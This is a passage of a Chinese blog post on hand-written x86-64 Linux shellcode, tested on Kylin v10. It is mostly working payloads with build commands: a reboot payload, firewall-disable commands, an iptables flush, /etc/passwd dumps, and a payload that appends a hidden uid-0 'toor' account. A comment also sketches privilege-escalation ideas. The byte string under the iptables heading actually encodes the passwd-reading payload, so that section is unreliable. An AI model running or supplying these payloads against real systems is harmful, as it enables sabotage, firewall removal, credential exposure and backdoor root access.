class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> shellcode[] =  <span class="string">&quot;\x48\x31\xd2\x52\x48\xbb\x6e\x2f\x72\x65\x62\x6f\x6f\x74\x53\x48\xbb\x2f\x75\x73\x72\x2f\x73\x62\x69\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line">    <span class="comment">//当shellcode包含空字符时，printf 将会打印出错误的 shellcode 长度</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Shellcode length: %d bytes\n&quot;</span>,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    (*(<span class="type">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc execve_reboot.c -o execve_reboot -z execstack -z norelro -no-pie -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./execve_reboot</span></span><br></pre></td></tr></table></figure><p>成功重启。</p><h2 id="3-防火墙"><a class="markdownIt-Anchor" href="#3-防火墙"></a> 3. 防火墙</h2><h3 id="31-关闭防火墙"><a class="markdownIt-Anchor" href="#31-关闭防火墙"></a> 3.1 关闭防火墙</h3><p>与防火墙相关的指令，转载于：<a href="https://www.cnblogs.com/jxldjsn/p/10794171.html">Linux关闭防火墙命令</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:查看防火状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line"></span><br><span class="line">2:暂时关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">3:永久关闭防火墙</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables off</span><br><span class="line"></span><br><span class="line">4:重启防火墙</span><br><span class="line">systemctl enable firewalld</span><br><span class="line"></span><br><span class="line">5:永久关闭后重启</span><br><span class="line">//暂时还没有试过</span><br><span class="line">chkconfig iptables on</span><br></pre></td></tr></table></figure><p>我用systemctl 来查看防火墙，发现kylin v10似乎默认没有装防火墙的，那我们就自己装一下。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220808235702935.png" alt="image-20220808235702935"></p><p>查看防火墙状态：</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220808235838073.png" alt="image-20220808235838073"></p><p>我发现，不管是关闭防火墙，还是打开防火墙，都需要 root 权限。而且在<a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a><a href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes</a> 这两个网站上，均没有关于防火墙的 shellcode。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220816093541072.png" alt="image-20220816093541072"></p><p>不过没有发现这个防火墙的shellcode，但是我发现了 iptable 的shellcode。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220816094308437.png" alt="image-20220816094308437"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#Title: Linux/x86-64 - execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL) - 49 bytes</span><br><span class="line">#    Author: 10n1z3d &lt;10n1z3d[at]w[dot]cn&gt;</span><br><span class="line">#    Date: Fri 09 Jul 2010 03:26:12 PM EEST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">         </span><br><span class="line">_start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    word 0x462d</span><br><span class="line">    mov     rcx, rsp</span><br><span class="line">       </span><br><span class="line">    mov     rbx, 0x73656c626174ffff</span><br><span class="line">    shr     rbx, 0x10</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rbx, 0x70692f6e6962732f</span><br><span class="line">    push    rbx</span><br><span class="line">    mov     rdi, rsp</span><br><span class="line">         </span><br><span class="line">    push    rax</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rdi</span><br><span class="line">    mov     rsi, rsp</span><br><span class="line">        </span><br><span class="line">    ; execve(&quot;/sbin/iptables&quot;, [&quot;/sbin/iptables&quot;, &quot;-F&quot;], NULL);</span><br><span class="line">    mov     al, 0x3b</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ nasm -f elf64 iptable.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 iptable.o -o iptable</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ strace ./iptable </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d iptable.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x70\x61\x73\x73\x77\x64\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc iptable.c -o iptable -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ sudo ./iptable</span><br><span class="line">*/</span><br><span class="line">#需要root权限执行，否者缺少权限无法执行。</span><br></pre></td></tr></table></figure><h3 id="32-修改防火墙规则"><a class="markdownIt-Anchor" href="#32-修改防火墙规则"></a> 3.2 修改防火墙规则</h3><blockquote><p>​<a href="https://www.jb51.net/article/136624.htm">linux防火墙iptables规则的查看、添加、删除和修改方法总结</a></p></blockquote><h2 id="4-passwd"><a class="markdownIt-Anchor" href="#4-passwd"></a> 4. passwd</h2><h3 id="41-读取-passwd"><a class="markdownIt-Anchor" href="#41-读取-passwd"></a> 4.1 读取 passwd</h3><p>通过系统调用 <code>命令cat</code> 读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Linux/x64 - execve &quot;cat /etc/passwd&quot; Shellcode (66 bytes)</span><br><span class="line"># Date: 2022-08-14</span><br><span class="line"># Author: rgzz</span><br><span class="line"># Tested on: Kylin v10</span><br><span class="line"># Shellcode Length: 66</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">;execve(&quot;/bin/cat&quot;, [&quot;/bin/cat&quot;, &quot;/etc/passwd&quot;], NULL)</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">       xor rax, rax                   ; Zeroes out RAX.</span><br><span class="line">       xor rbp, rbp                   ; Zeroes out RBP.</span><br><span class="line"></span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x6477737361702f63    ; Moves value &quot;dwsspa/c&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaueof RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, 0x74652f2f2f2f2f2f    ; Moves value &quot;te//////&quot; into RBP.</span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbp, rsp                   ; Copies the value of the Stack into RBP.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rbx, 0x7461632f6e69622f    ; Moves value &quot;tac/nib/&quot; into RBX.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack.</span><br><span class="line"></span><br><span class="line">       mov rbx, rsp                   ; Copies the value of the Stack into RBX.</span><br><span class="line"></span><br><span class="line">       mov rdi, rsp                   ; Copies the value of the Stack into RDI.</span><br><span class="line">       push rax                       ; Pushes RAX&#x27;s NULL-DWORD.</span><br><span class="line"></span><br><span class="line">       mov rdx, rsp                   ; Copies the value of the Stack into RDX. As the previous DWORD was completely NULL, RDX is set to 0.</span><br><span class="line"></span><br><span class="line">       push rbp                       ; Pushes the vaue of RBP into the Stack.</span><br><span class="line">       push rbx                       ; Pushes the vaue of RBX into the Stack. The full string should be &quot;cat /etc/passwd&quot;.</span><br><span class="line"></span><br><span class="line">       mov rsi, rsp                   ; Copies this entire string from the Stack into RSI.</span><br><span class="line"></span><br><span class="line">       push word 59                   ; Pushes the value 59 (syscall value for execve in the x64 format).</span><br><span class="line">       pop ax                         ; Pops this value into AX so there are no NULLs.</span><br><span class="line">       syscall                        ; The syscall is executed.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ nasm -f elf64 cat_passwd.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 cat_passwd.o -o cat_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ strace ./cat_passwd </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d cat_passwd.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x70\x61\x73\x73\x77\x64\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc cat_passwd.c -o cat_passwd -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./cat_passwd</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>通过系统调用 <code>read</code> 方式读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Linux/x64 - read passwd</span><br><span class="line"># Date: 2022-08-14</span><br><span class="line"># Author: rgzz</span><br><span class="line"># Tested on: Kylin v10</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line">  </span><br><span class="line">_readfile:</span><br><span class="line">; syscall open file, 0x2</span><br><span class="line">; open(&#x27;/etc/passwd&#x27;, O_RDWR), O_RDWR=0x2</span><br><span class="line">pop rdi ; pop path value</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 2</span><br><span class="line">xor rsi, rsi ; set O_RDWR flag</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall read file, 0x0</span><br><span class="line">; read(fd, buf, 0xfff), rdi=rax=fd(fd is open&#x27;s return number)</span><br><span class="line">sub sp, 0xfff</span><br><span class="line">lea rsi, [rsp]</span><br><span class="line">mov rdi, rax</span><br><span class="line">xor rdx, rdx</span><br><span class="line">mov dx, 0xfff; size to read</span><br><span class="line">xor rax, rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall write to stdout, 0x1</span><br><span class="line">; write(fd, buf, 0xfff)</span><br><span class="line">xor rdi, rdi</span><br><span class="line">inc rdi ; set stdout fd = 1</span><br><span class="line">mov rdx, rax</span><br><span class="line">xor rax, rax</span><br><span class="line">inc rax</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">; syscall exit</span><br><span class="line">xor rax, rax</span><br><span class="line">add al, 60</span><br><span class="line">syscall</span><br><span class="line">  </span><br><span class="line">_push_filename:</span><br><span class="line">call _readfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 rw_passwd.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rw_passwd.o -o rw_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rw_passwd</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d rw_passwd.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc rw_passwd.c -o rw_passwd -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rw_passwd</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3 id="42-写入-passwd"><a class="markdownIt-Anchor" href="#42-写入-passwd"></a> 4.2 写入 passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">; Title: add root user (toor:toor)</span><br><span class="line">; Date: 2022-08-14</span><br><span class="line">; Author: rgzz</span><br><span class="line">; Tested on: kylin v10</span><br><span class="line">;</span><br><span class="line">; Action: Adds a user into /etc/passwd with the following information</span><br><span class="line">; username: toor</span><br><span class="line">; password: toor</span><br><span class="line">; uid: 0</span><br><span class="line">; gid: 0</span><br><span class="line">; home: /root</span><br><span class="line">; shell: /bin/sh</span><br><span class="line">;</span><br><span class="line">; toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">jmp _push_filename</span><br><span class="line"></span><br><span class="line">; #define __NR_open 2</span><br><span class="line">; int open(const char *pathname, int flags);</span><br><span class="line">; rax -&gt; 2</span><br><span class="line">; rdi -&gt; /etc/passwd</span><br><span class="line">; rsi -&gt; 0x401</span><br><span class="line">;</span><br><span class="line">; &gt;&gt;&gt; hex(os.O_WRONLY ^ os.O_APPEND)</span><br><span class="line">; 0x401</span><br><span class="line">_openfile:</span><br><span class="line">pop rdi   ; rdi -&gt; /etc/passwd</span><br><span class="line">xor rax, rax</span><br><span class="line">xor rsi, rsi  ; rsi to zero</span><br><span class="line">mov si, 0x401 ; rsi -&gt; O_WRONLY|O_APPEND</span><br><span class="line">add al, 0x2 ; rax -&gt; 2 (open)</span><br><span class="line">syscall ; open</span><br><span class="line"></span><br><span class="line">xchg rdi, rax ; save returned fd</span><br><span class="line">jmp short get_entry_address ; start jmp-call-pop</span><br><span class="line"></span><br><span class="line">write_entry:</span><br><span class="line">; #define __NR_write 1</span><br><span class="line">; ssize_t write(int fd, const void *buf, size_t count);</span><br><span class="line">; rax -&gt; 1</span><br><span class="line">; rdi -&gt; results of open syscall</span><br><span class="line">; rsi -&gt; user&#x27;s entry</span><br><span class="line">; rdx -&gt; len of user&#x27;s entry</span><br><span class="line">pop rsi ; end jmp-call-pop, rsi -&gt; user&#x27;s entry</span><br><span class="line">push 0x1</span><br><span class="line">pop rax ; rax -&gt; 1</span><br><span class="line">push 38 ; length + 1 for newline</span><br><span class="line">pop rdx ; rdx -&gt; length of user&#x27;s entry</span><br><span class="line">syscall ; write</span><br><span class="line"></span><br><span class="line">; #define __NR_exit 60</span><br><span class="line">; void _exit(int status);</span><br><span class="line">; rax -&gt; 60</span><br><span class="line">; rdi -&gt; don&#x27;t care</span><br><span class="line">push 60</span><br><span class="line">pop rax</span><br><span class="line">syscall ; OS will handle closing fd at exit</span><br><span class="line"></span><br><span class="line">get_entry_address:</span><br><span class="line">call write_entry</span><br><span class="line">user_entry: db &quot;toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh&quot;,0xa</span><br><span class="line"></span><br><span class="line">_push_filename:</span><br><span class="line">call _openfile</span><br><span class="line">path: db &quot;/etc/passwd&quot;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc -c addRootUser.c -o addRootUser.o</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc addRootUser.o -o addRootUser -static</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 addRootUser.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 addRootUser.o -o addRootUser</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./addRootUser</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d addRootUser.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line">//注意：上面这个程序，编译后需要以root权限来执行，否则没有效果。至于提权，，目前还没有思路。。</span><br><span class="line">//提权思路：在系统文件中找到一个具有777权限的文件，在里面写入我们的提权代码执行，或者是把我们的可执行文件，提升权限执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\xeb\x4c\x5f\x48\x31\xc0\x48\x31\xf6\x66\xbe\x01\x04\x04\x02\x0f\x05\x48\x97\xeb\x0e\x5e\x6a\x01\x58\x6a\x26\x5a\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xed\xff\xff\xff\x74\x6f\x6f\x72\x3a\x73\x58\x75\x43\x4b\x69\x37\x6b\x33\x58\x68\x2f\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\xe8\xaf\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc addRootUser.c -o addRootUser -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ sudo ./addRootUser</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220814135049772.png" alt="image-20220814135049772"></p><h4 id="421-其它版本"><a class="markdownIt-Anchor" href="#421-其它版本"></a> 4.2.1 其它版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span 